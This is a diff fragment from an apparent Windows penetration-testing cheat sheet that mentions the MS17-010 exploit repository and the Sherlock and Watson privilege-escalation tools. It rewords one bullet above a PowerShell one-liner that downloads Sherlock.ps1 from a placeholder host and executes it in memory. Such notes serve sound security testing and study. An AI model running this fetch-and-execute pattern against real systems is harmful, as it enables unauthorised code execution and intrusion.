@@ -101,7 +101,7 @@ git clone https://github.com/worawit/MS17-010.git
   
  * Serlock
    * Config: Add to the last line the "Find-AllVulns".
-   * Run sherlock with download:
+   *  Download and run Sherlock:
      ##### echo IEX(New-Object Net.WebClient).DownloadString('http://\<ip>:\<port>/Sherlock.ps1') | powershell -noprofile -
  
  * Watson
